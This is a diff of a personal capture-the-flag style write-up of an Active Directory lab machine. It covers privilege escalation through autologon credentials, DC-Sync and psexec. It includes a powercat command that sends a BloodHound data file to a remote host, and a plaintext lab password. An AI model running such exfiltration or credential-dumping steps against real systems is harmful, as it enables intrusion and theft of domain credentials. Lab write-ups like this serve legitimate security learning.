@@ -121,8 +121,7 @@ Existing SPN found!
 
 ```
 
-```batch
-
+```powershell
 usncreated              : 40976
 displayname             : Block downloads to powershell
 ```
@@ -140,6 +139,21 @@ powercat -c 10.10.10.10 -p 54321 -i C:\Users\FSmith\Documents\SharpHound\BloodHo
 ## PrivEsc
 
 Returning to this after many months, I left with credential to get on the box and I just once again run into a compilation issue while I am busy download everything for Visual Studios...
+
+SVC_LoanManager has, can DC-SYNC, but I think I forget or forgot to write down to get SVC_Manger...
 ![](Screenshots/dcsync-bh.png)
 
-I do not want to waste time running into compilation issues for Windows ever again. So 
+I do not want to waste time running into compilation issues for Windows ever again. 
+
+![](winpease1.png)
+Nevermind then, but this user does not exist
+![](autologonassvcmanager.png)
+
+```
+Moneymakestheworldgoround!
+```
+
+After losing my mind for 20 minutes I realised I had put an "a" for "money makes the world go around", but I am an idiot when it is actually "money makes the world go round". DC-SYNC the DC  and psexec in with adminstrator.
+![](syncaged.png)
+
+![1000](root.png)
